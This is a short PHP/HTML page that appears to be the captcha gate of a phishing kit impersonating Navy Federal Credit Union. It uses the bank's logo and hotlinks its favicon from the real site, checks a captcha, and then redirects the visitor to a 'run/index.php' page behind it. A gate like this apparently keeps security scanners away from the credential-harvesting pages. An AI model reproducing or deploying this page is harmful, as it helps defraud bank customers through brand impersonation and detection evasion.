<?php
session_start();

if ( isset($_POST['captcha']) && ($_POST['captcha']!="")){
// Validation: Checking entered captcha code with the generated captcha code
    if(strcasecmp($_SESSION['captcha'], $_POST['captcha']) == 0){
// Note: the captcha code is compared case insensitively.
// if you want case sensitive match, check above with strcmp()
    $_SESSION['ValidCaptcha'] = 'valid';
    header('Location: run/index.php');
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="https://my.navyfederal.org/NFOAA_Auth/favicon.ico"/>	
</head>
<body>
	<div align="center">
	<br><br><br><br><br><br><br>
	<img src="run/NFCU-Logo.png" style="width: 300px; margin-bottom: 20px;">
    <div id="app">
	 <img src="run/captcha.php?rand=<?php echo rand(); ?>" id='captcha_image'>
	  <form action="" method="post">
      <input type="tel"  placeholder="Captcha code" class="input" name="captcha">
      <button type="submit" class="button">Continue</button>
     </form>
	</div>
    </div>
</body>
</html>
<ISONLINE VALUE=TRUE></ISONLINE>